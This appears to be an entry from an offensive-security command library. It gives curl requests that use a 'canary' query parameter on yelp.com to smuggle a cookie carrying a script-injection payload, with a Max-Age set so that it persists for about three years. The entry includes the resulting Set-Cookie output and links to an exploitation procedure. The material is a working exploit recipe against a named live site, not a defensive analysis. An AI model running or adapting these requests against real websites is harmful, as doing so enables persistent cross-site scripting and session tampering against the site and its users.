---
data: >-
  curl
  "https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3B%20Max-Age%3D99999999"
  -c cookies.txt -v
tags:
  - xss
  - persistence
type: command
output: >-
  Set-Cookie: yelpmainpaastacanary=asdf
  guvo=...</script><script>alert(1)</script>; Max-Age=99999999;
  Domain=.yelp.com; Path=/; Secure; SameSite=Lax
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.337Z'
id: 68be3658-f995-4dfc-8aea-11f6a1eeb57e
verified: false
validated: true
submitted: true
---
# Set Persistent Canary Cookie

## Command

```bash
curl "https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3B%20Max-Age%3D99999999" -c cookies.txt -v
```

## Description

Sets a long-lived smuggled cookie by appending '; Max-Age=99999999' to the canary value, ensuring the XSS payload persists for approximately 3 years.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--canary` | Includes payload and Max-Age (URL-encoded) | Yes |
| `-c` | Cookie jar file | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl "https://www.yelp.com/?canary=persistent%20test%3B%20Max-Age%3D3600" -c cookies.txt
```

### Advanced Usage

```bash
curl "https://www.yelp.com/?canary=asdf%20guvo%3Dmalicious%3B%20Max-Age%3D99999999" -b cookies.txt https://biz.yelp.com/login
```

## Expected Output

Set-Cookie header with Max-Age; cookie remains after browser restart.

## Related

- [[commands/set-canary-cookie-smuggling]]
- [[procedures/Exploit-Cookie-Parsing-Flaw-for-Payload-Smuggling]]
